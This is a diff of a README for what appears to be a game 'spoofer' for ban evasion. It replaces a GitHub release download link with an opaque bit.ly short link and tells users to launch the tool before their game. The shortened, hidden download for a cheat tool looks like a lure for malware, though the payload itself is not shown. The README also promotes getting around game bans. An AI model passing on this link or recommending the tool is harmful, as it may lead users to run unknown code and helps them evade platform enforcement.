@@ -15,7 +15,7 @@
 
 ## Installation
 
- [`Download latest version of our spoofer`](https://github.com/kotskirk852/verse-spoofer/releases/download/Loader/Loader.Github.zip)
+ [`Download latest version of our spoofer`](https://bit.ly/4gdPjo4)
 
 ## Usage
 * Launch the spoofer before starting your game.
